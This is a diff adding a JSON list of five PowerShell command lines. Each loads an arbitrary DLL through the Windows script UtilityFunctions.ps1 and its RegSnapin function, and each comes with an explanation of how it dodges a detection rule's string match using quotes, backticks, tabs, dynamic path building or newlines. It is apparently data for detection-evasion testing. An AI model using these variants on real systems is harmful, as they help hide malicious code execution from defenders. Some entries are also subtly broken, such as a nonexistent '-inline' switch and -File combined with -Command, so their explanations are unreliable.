@@ -1,0 +1,22 @@
+[
+  {
+    "output": "powershell.exe -File \"C:\\Windows\\diagnostics\\system\\WindowsUpdate\\UtilityFunctions.ps1\" -Command \"& {RegSnapin; [void](Get-SnapinProxy -DllPath c:\\test\\myproxy.dll)}\"",
+    "explanation": "Insertion technique. Encloses the script path and commands in quotes. It targets the `CommandLine|contains` rule condition. Since the rule looks for the literal string `RegSnapin ` (with a trailing space), separating or immediately following `RegSnapin` with a semicolon or closing brace inside a script block bypasses the trailing space requirement while remaining syntactically correct in PowerShell."
+  },
+  {
+    "output": "powershell.exe -ExecutionPolicy Bypass -Command \". C:\\Windows\\diagnostics\\system\\WindowsUpdate\\Utility`Functions.ps1; RegSnapin -DllPath C:\\test\\myproxy.dll\"",
+    "explanation": "Insertion technique. Uses PowerShell's backtick (`) escape character inside the script filename string (`Utility`Functions.ps1`). This directly avoids the literal match for `UtilityFunctions.ps1` in the `CommandLine` selection, but PowerShell natively unescapes the string and processes the correct filename during script invocation."
+  },
+  {
+    "output": "powershell.exe -File C:\\Windows\\diagnostics\\system\\WindowsUpdate\\utilityfunctions.ps1 -Command \"RegSnapin\t-DllPath C:\\test\\myproxy.dll\"",
+    "explanation": "Substitution technique. Replaces the standard trailing space character after `RegSnapin ` with a horizontal tab (`\t`) character. This breaks the specific string match condition `RegSnapin ` while ensuring the PowerShell engine parses the token delimiter properly during runtime execution."
+  },
+  {
+    "output": "powershell.exe -inline \". (Join-Path 'C:\\Windows\\diagnostics\\system\\WindowsUpdate' 'UtilityFunctions.ps1'); &('RegSnapin') -DllPath C:\\test\\myproxy.dll\"",
+    "explanation": "Recoding/Encoding technique. Dynamically constructs the script path via `Join-Path` and invokes the target function using a string literal operator `&('RegSnapin')`. This successfully prevents both `UtilityFunctions.ps1` and `RegSnapin ` from appearing as contiguous, explicit string tokens in the process creation command line."
+  },
+  {
+    "output": "powershell.exe -c \". $env:windir\\diagnostics\\system\\WindowsUpdate\\UtilityFunctions.ps1; RegSnapin\r\n-DllPath C:\\test\\myproxy.dll\"",
+    "explanation": "Insertion technique. Employs environment variables (`$env:windir`) for the path and inserts a newline sequence (`\r\n`) immediately after `RegSnapin`. This eliminates the trailing space signature matched by the rule while allowing the script interpreter to execute the command natively as a multi-line statement."
+  }
+]
